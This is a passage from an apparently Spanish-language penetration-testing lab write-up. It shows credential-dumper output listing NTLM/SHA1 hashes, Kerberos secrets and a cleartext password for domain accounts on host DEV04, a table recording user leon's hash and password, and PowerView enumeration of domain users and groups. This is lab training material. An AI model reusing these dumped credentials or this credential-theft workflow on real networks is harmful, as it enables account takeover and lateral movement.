         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 44059 (00000000:0000ac1b)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:55 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 44026 (00000000:0000abfa)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:55 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 42896 (00000000:0000a790)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:54 PM
SID               :
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2283791 (00000000:0022d90f)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/2/2025 5:02:59 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2281387 (00000000:0022cfab)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/2/2025 5:02:59 AM
SID               : S-1-5-96-0-3
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1369284 (00000000:0014e4c4)
Session           : RemoteInteractive from 2
User Name         : yoshi
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 6/2/2025 4:42:06 AM
SID               : S-1-5-21-976142013-3766213998-138799841-1110
        msv :
         [00000003] Primary
         * Username : yoshi
         * Domain   : MEDTECH
         * NTLM     : fdf36048c1cf88f5630381c5e38feb8e
         * SHA1     : 46d778aa60c13155094d085faef70a1f92442773
         * DPAPI    : 3428d1f5289eb8cbec90bd5f761f4666
        tspkg :
        wdigest :
         * Username : yoshi
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : yoshi
         * Domain   : MEDTECH.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1344628 (00000000:00148474)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/2/2025 4:42:05 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : 67fde543d7569ef3fd265e13c9a5a180
         * SHA1     : 3a64719b89867334fb51febe96e1e47187619050
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : 27 93 22 6e 7f c1 1b dc 2d 10 21 d1 ec c6 d0 e9 fa a0 23 30 24 8a 68 d2 8d 65 fb 5b f0 2a cd b4 0d 2b 3c cd 2f 55 45 aa 27 86 7c 0f 92 28 d7 4c 57 f9 b3 c0 07 b6 27 db 48 56 50 46 9b dc 81 50 09 5c 10 c3 2c 0a 26 81 d0 29 03 18 5f 01 26 55 a9 09 94 d2 ef 31 9a 77 6e a4 28 a5 83 eb 2a 41 47 b7 2a fa e6 2a 54 ee 60 4e 0a d2 69 4b c9 fd 7f e3 94 37 07 87 ea 85 9c f9 5f e7 f0 fe 1d b8 e2 55 8b f4 fb 01 b0 9c 12 4a 81 bf 5d 5b 2a 66 c4 a0 21 6d 73 08 38 3a 0b 67 29 24 fa 0d 31 86 b8 69 cd 43 0c a3 d3 d3 25 51 9f 72 20 6c 58 47 4b 8e 83 c4 e0 5b d2 ed fb a2 6b 1f 09 c5 69 f3 f3 21 1e f0 32 5b 2e 13 6a e3 c3 ab 1e a2 9c 73 03 2c ba 4a d8 05 f0 f1 9c ff 3d 0a c3 93 96 b4 19 09 5e b3 6d 69 dd b3 4f 9c 2f 0a e7 f9 f1 6b
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 291309 (00000000:000471ed)
Session           : Interactive from 1
User Name         : leon
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/23/2024 10:38:20 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1105
        msv :
         [00000003] Primary
         * Username : leon
         * Domain   : MEDTECH
         * NTLM     : 2e208ad146efda5bc44869025e06544a
         * SHA1     : 8d1c9e13d2d2c20dbee8b4eacb20b73f06573c96
         * DPAPI    : a7bad14f64c3cf0d7ae2b5f6392a0b6d
        tspkg :
        wdigest :
         * Username : leon
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : leon
         * Domain   : MEDTECH.COM
         * Password : rabbit:)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:56 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 74698 (00000000:000123ca)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:56 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : 67fde543d7569ef3fd265e13c9a5a180
         * SHA1     : 3a64719b89867334fb51febe96e1e47187619050
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : 27 93 22 6e 7f c1 1b dc 2d 10 21 d1 ec c6 d0 e9 fa a0 23 30 24 8a 68 d2 8d 65 fb 5b f0 2a cd b4 0d 2b 3c cd 2f 55 45 aa 27 86 7c 0f 92 28 d7 4c 57 f9 b3 c0 07 b6 27 db 48 56 50 46 9b dc 81 50 09 5c 10 c3 2c 0a 26 81 d0 29 03 18 5f 01 26 55 a9 09 94 d2 ef 31 9a 77 6e a4 28 a5 83 eb 2a 41 47 b7 2a fa e6 2a 54 ee 60 4e 0a d2 69 4b c9 fd 7f e3 94 37 07 87 ea 85 9c f9 5f e7 f0 fe 1d b8 e2 55 8b f4 fb 01 b0 9c 12 4a 81 bf 5d 5b 2a 66 c4 a0 21 6d 73 08 38 3a 0b 67 29 24 fa 0d 31 86 b8 69 cd 43 0c a3 d3 d3 25 51 9f 72 20 6c 58 47 4b 8e 83 c4 e0 5b d2 ed fb a2 6b 1f 09 c5 69 f3 f3 21 1e f0 32 5b 2e 13 6a e3 c3 ab 1e a2 9c 73 03 2c ba 4a d8 05 f0 f1 9c ff 3d 0a c3 93 96 b4 19 09 5e b3 6d 69 dd b3 4f 9c 2f 0a e7 f9 f1 6b
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DEV04$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:54 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : dev04$
         * Domain   : MEDTECH.COM
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :
```
#### Credenciales de leon:

|Usuario|hashNTLM | password | hostname |
|-------|---------|----------|
|leon   |2e208ad146efda5bc44869025e06544a | rabbit:) | DEV04 |


#### Enumeramos al usuario

- Obtenemos: [Grupos, privilegios] 

> **IMPORTANTE!** Enumerar al usuario **leon** con PowerView desde el usuario **leon** es decir desde su sesion. Si lo ahcemos desde la cuenta Administrator PowerView da problemas.

```powershell
PS C:\Users\leon> Get-NetUser


logoncount             : 185
badpasswordtime        : 6/2/2025 5:51:38 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=medtech,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 6/2/2025 4:36:59 AM
name                   : Administrator
lockouttime            : 0
objectsid              : S-1-5-21-976142013-3766213998-138799841-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 6/2/2025 11:36:59 AM
instancetype           : 4
objectguid             : ca1b2dde-c60a-4ce3-8055-ac71d1e9105d
lastlogon              : 6/2/2025 4:37:08 AM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata  : {9/27/2022 6:02:51 PM, 9/27/2022 6:02:51 PM, 9/27/2022 5:47:42 PM, 1/1/1601 6:12:16 PM}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=medtech,DC=com, CN=Domain
                         Admins,CN=Users,DC=medtech,DC=com, CN=Enterprise Admins,CN=Users,DC=medtech,DC=com, CN=Schema
                         Admins,CN=Users,DC=medtech,DC=com...}
whencreated            : 9/27/2022 5:46:16 PM
iscriticalsystemobject : True
badpwdcount            : 2
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 12/5/2022 11:04:32 AM
usnchanged             : 139325

pwdlastset             : 12/31/1600 4:00:00 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account for guest access to the computer/domain
distinguishedname      : CN=Guest,CN=Users,DC=medtech,DC=com
objectclass            : {top, person, organizationalPerson, user}
name                   : Guest
objectsid              : S-1-5-21-976142013-3766213998-138799841-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 9/27/2022 5:46:16 PM
instancetype           : 4
objectguid             : b282544b-0606-4a01-93e3-3cbbd7c9844b
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata  : {9/27/2022 5:47:42 PM, 1/1/1601 12:00:01 AM}
memberof               : CN=Guests,CN=Builtin,DC=medtech,DC=com
whencreated            : 9/27/2022 5:46:16 PM
badpwdcount            : 0
cn                     : Guest
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8197
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 8197

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
description           : offsec
distinguishedname     : CN=offsec,CN=Users,DC=medtech,DC=com
objectclass           : {top, person, organizationalPerson, user}
displayname           : offsec
name                  : offsec
objectsid             : S-1-5-21-976142013-3766213998-138799841-1000
samaccountname        : offsec
logonhours            : {255, 255, 255, 255...}
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 12/31/1600 4:00:00 PM
countrycode           : 0
whenchanged           : 9/27/2022 5:46:16 PM
instancetype          : 4
objectguid            : 4facd96b-c5f5-4ac8-b820-ab785958c5cd
lastlogon             : 12/31/1600 4:00:00 PM
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata : {9/27/2022 5:47:42 PM, 1/1/1601 12:00:01 AM}
memberof              : CN=Users,CN=Builtin,DC=medtech,DC=com
whencreated           : 9/27/2022 5:46:16 PM
badpwdcount           : 0
cn                    : offsec
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 8198
primarygroupid        : 513
pwdlastset            : 9/27/2022 10:33:23 AM
usnchanged            : 8198

logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-976142013-3766213998-138799841-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 9/27/2022 6:02:51 PM
instancetype                  : 4
objectguid                    : 619781d7-1899-4604-9837-80cef0013968
lastlogon                     : 12/31/1600 4:00:00 PM
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : {9/27/2022 6:02:51 PM, 9/27/2022 5:47:42 PM, 1/1/1601 12:04:16 AM}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=medtech,DC=com
whencreated                   : 9/27/2022 5:47:41 PM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 9/27/2022 10:47:41 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 12799

logoncount                    : 25
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=leon,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 6/2/2025 5:53:07 AM
name                          : leon
lockouttime                   : 0
objectsid                     : S-1-5-21-976142013-3766213998-138799841-1105
samaccountname                : leon
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 6/2/2025 12:53:07 PM
instancetype                  : 4
usncreated                    : 12971
objectguid                    : 02272fda-cbc9-4a59-b15e-5e2ffc2fbf86
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : {9/28/2022 11:02:51 AM, 1/1/1601 12:00:00 AM}
memberof                      : CN=Domain Admins,CN=Users,DC=medtech,DC=com
lastlogon                     : 6/2/2025 5:54:46 AM
badpwdcount                   : 0
cn                            : leon
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 9/28/2022 10:07:16 AM
primarygroupid                : 513
pwdlastset                    : 11/17/2022 12:36:23 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 139526

logoncount                    : 94
badpasswordtime               : 10/4/2022 8:15:22 AM
distinguishedname             : CN=joe,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 6/2/2025 4:38:23 AM
name                          : joe
lockouttime                   : 0
objectsid                     : S-1-5-21-976142013-3766213998-138799841-1106
samaccountname                : joe
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 6/2/2025 11:38:23 AM
instancetype                  : 4
usncreated                    : 13002
objectguid                    : 9bdcf228-d9ae-4846-8c3d-d64bc57e9cca
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : {10/4/2022 3:42:51 PM, 1/1/1601 12:00:00 AM}
memberof                      : CN=Backup Operators,CN=Builtin,DC=medtech,DC=com
lastlogon                     : 6/2/2025 4:38:23 AM
badpwdcount                   : 0
cn                            : joe
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 9/28/2022 10:41:43 AM
primarygroupid                : 513
pwdlastset                    : 11/11/2022 2:02:39 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 139401

logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=peach,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
name                          : peach
objectsid                     : S-1-5-21-976142013-3766213998-138799841-1107
samaccountname                : peach
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 2/19/2023 9:35:01 PM
instancetype                  : 4
usncreated                    : 13009
objectguid                    : 597dbfe5-0467-4f00-830c-1c632b883a84
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
lastlogon                     : 12/31/1600 4:00:00 PM
badpwdcount                   : 0
cn                            : peach
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 9/28/2022 10:50:06 AM
primarygroupid                : 513
pwdlastset                    : 9/28/2022 3:51:13 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 131232

logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=mario,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
name                          : mario
objectsid                     : S-1-5-21-976142013-3766213998-138799841-1108
samaccountname                : mario
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 2/19/2023 9:34:43 PM
instancetype                  : 4
usncreated                    : 13012
objectguid                    : 28e316e8-a55a-4166-9707-d17df3bb7592
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
lastlogon                     : 12/31/1600 4:00:00 PM
badpwdcount                   : 0
cn                            : mario
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 9/28/2022 10:50:46 AM
primarygroupid                : 513
pwdlastset                    : 9/28/2022 3:50:46 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 131230

logoncount                    : 36
badpasswordtime               : 10/28/2022 3:08:10 AM
distinguishedname             : CN=wario,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 11/15/2022 1:43:35 AM
name                          : wario
lockouttime                   : 0
objectsid                     : S-1-5-21-976142013-3766213998-138799841-1109
samaccountname                : wario
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 2/19/2023 9:35:20 PM
instancetype                  : 4
usncreated                    : 13018
objectguid                    : 08035914-152e-457e-9d87-4f555cdd9af2
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
lastlogon                     : 11/15/2022 1:43:35 AM
badpwdcount                   : 0
cn                            : wario
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 9/28/2022 10:50:46 AM
primarygroupid                : 513
pwdlastset                    : 11/15/2022 1:43:27 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 131236

logoncount                    : 10
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=yoshi,CN=Users,DC=medtech,DC=com
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 6/2/2025 4:42:02 AM
name                          : yoshi
lockouttime                   : 0
objectsid                     : S-1-5-21-976142013-3766213998-138799841-1110
samaccountname                : yoshi
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 6/2/2025 11:42:02 AM
instancetype                  : 4
usncreated                    : 13024
objectguid                    : 7ee296a3-f973-4c23-b1fa-5eedfd8a36b9
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=medtech,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
lastlogon                     : 6/2/2025 4:42:06 AM
badpwdcount                   : 0
cn                            : yoshi
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 9/28/2022 10:50:47 AM
primarygroupid                : 513
pwdlastset                    : 11/15/2022 5:25:26 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 139419

PS C:\Users\leon> Get-NetDomain


Forest                  : medtech.com
DomainControllers       : {DC01.medtech.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC01.medtech.com
RidRoleOwner            : DC01.medtech.com
InfrastructureRoleOwner : DC01.medtech.com
Name

PS C:\Users\leon> Get-NetUser | select cn

cn
--
Administrator
Guest
offsec
krbtgt
leon
joe
peach
mario
wario
yoshi

PS C:\Users\leon> Get-NetUser | select cn,pwdlastset,lastlogon

cn            pwdlastset             lastlogon
--            ----------             ---------
Administrator 12/5/2022 11:04:32 AM  6/2/2025 4:37:08 AM
Guest         12/31/1600 4:00:00 PM  12/31/1600 4:00:00 PM
offsec        9/27/2022 10:33:23 AM  12/31/1600 4:00:00 PM
